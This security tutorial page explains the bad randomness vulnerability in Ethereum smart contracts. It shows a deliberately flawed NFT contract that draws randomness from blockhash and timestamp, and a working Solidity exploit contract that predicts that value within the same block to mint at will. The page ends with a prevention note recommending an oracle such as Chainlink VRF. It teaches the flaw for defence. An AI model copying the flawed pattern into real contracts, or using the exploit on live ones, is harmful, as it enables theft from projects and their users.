---
title: Bad Randomness
displayed_sidebar: generalSidebar
tags: 
- smart contracts
- security
  - vulnerabilities
  - randomness
  - nft
  - gamefi
  - ethereum
  - solidity
  - pseudo-random
  - blockhash
  - keccak256
  - chainlink-vrf
---

# Bad Randomness

## Pseudo-Random Numbers

Many applications on Ethereum, such as NFT random tokenId draws, blind box openings, and GameFi combat outcomes, rely on random numbers. However, since all data on Ethereum is public and deterministic, traditional random generation methods like `random()` are not available.

Instead, projects often use pseudo-random number generators such as `blockhash()` and `keccak256()`. This approach, known as the Bad Randomness Vulnerability, allows attackers to predict outcomes, enabling them to manipulate results like minting specific rare NFTs.

This vulnerability is common in NFT and GameFi projects, including Meebits, Loots, and Wolf Game. It has led to significant financial losses, such as the SmartBillions Lottery exploit where attackers used predictable outcomes to win over 400 ETH. More information is available in the article, [The Blockchain Lottery SmartBillions Was Hacked for $120,000](https://crypto.news/blockchain-lottery-smartbillions-hacked-for-120000/).

## Example of a Bad Randomness Vulnerability

Let's explore a vulnerable NFT contract, `FlawedRandomizer.sol`.

```solidity
contract FlawedRandomizer is ERC721 {
    uint256 public totalMints;

    // Constructor initializes the NFT collection's name and symbol.
    constructor() ERC721("", ""){}

    // Mint function: mints only when the input luckyNumber equals the random number.
    function mintIfLucky(uint256 guessedNumber) public {
        uint256 pseudoRandomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // Get pseudo-random number
        require(pseudoRandomNumber == guessedNumber, "Try again next time!");

        _mint(msg.sender, totalMints);
        totalMints++;
    }
}
```

The main function `mintIfLucky()` requires users to enter a number between `0-99`. If it matches the chain-generated pseudo-random number `pseudoRandomNumber`, they can mint a lucky NFT. The vulnerability lies in the ability of users to perfectly predict the generated random number and mint the NFT.

Let's write an attack contract `Exploit.sol`.

```solidity
contract Exploit {
    function executeMint(FlawedRandomizer nftAddress) public {
        // Calculate the random number in advance
        uint256 predictedNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        ) % 100;
        // Use predictedNumber to execute the attack
        nftAddress.mintIfLucky(predictedNumber);
    }
}
```

The function `executeMint()` takes a `FlawedRandomizer` contract address as a parameter. Here, we calculate the `predictedNumber` and then pass it to the `mintIfLucky()` function to execute the attack. Since both `executeMint()` and `mintIfLucky()` are called in the same block, the `blockhash` and `block.timestamp` are the same, making the generated random number predictable.

## Prevention Strategy

Use off-chain random numbers provided by oracle projects to prevent this type of vulnerability, such as Chainlink VRF. These random numbers are generated off-chain and uploaded to the blockchain, ensuring they are unpredictable.
